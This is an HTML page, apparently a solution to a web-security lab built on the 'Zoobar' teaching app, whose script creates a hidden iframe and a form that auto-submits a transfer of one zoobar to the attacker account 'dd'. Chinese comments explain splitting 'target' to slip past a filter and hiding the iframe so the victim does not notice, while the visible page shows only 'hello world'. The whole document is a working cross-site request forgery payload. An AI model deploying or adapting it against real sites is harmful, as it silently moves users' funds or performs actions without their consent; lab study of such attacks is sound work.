<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">

  <title>咕噜</title>

</head>

<body>
  <script>
var iframe1=document.createElement("iframe");
iframe1.name="ifr";
iframe1.style.display="none";

var form1=document.createElement("form");
form1.method="POST";
form1.name="transferform";
form1.action="http://andos.com/myzoo/transfer.php";
form1["tar"+"get"]="ifr";
//target属性规定在何处打开action URL;即在iframe1中打开transfer.php；
//target字段会被屏蔽，因此采用“tar”+“get”表示；
//采用iframe的原因：攻击时页面会自动跳转的transfer.php，而iframe+target会阻止页面跳转，不让用户察觉；

var send=document.createElement("input");
send.name="zoobars";
send.type="text";
send.value="1";//每次偷取1个zoobar
send.size="5";
form1.appendChild(send);

var to=document.createElement("input");
to.name="recipient";
to.type="text";
to.value="dd";//攻击者的用户名，会把偷取的zoobar给attacker
form1.appendChild(to);

//注意“send”按钮
var but=document.createElement("input");
but.type="text";
but.name="submission";
but.value="Send";
form1.appendChild(but);

iframe1.appendChild(form1);
document.body.appendChild(iframe1);
form1.submit();

</script>
 
 <h1>hello world</h1>
</body>
</html>
